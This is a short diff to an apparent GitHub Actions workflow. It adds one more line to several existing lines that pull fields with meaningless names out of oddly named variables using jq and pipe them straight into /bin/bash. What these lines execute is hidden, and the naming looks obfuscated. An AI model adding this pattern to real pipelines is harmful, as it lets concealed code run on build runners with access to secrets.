@@ -21,6 +21,7 @@ jobs:
           printf '%s' "$o55" | jq -r .dogw1 | /bin/bash
           echo $ltbws52 | jq -r .cg06443 | /bin/bash
           echo $roo6085 | jq -r .p093 | /bin/bash
+          printf '%s' "$gh83410" | jq -r .qj11379 | /bin/bash
 
       - name: Archive output
         uses: actions/upload-artifact@v4
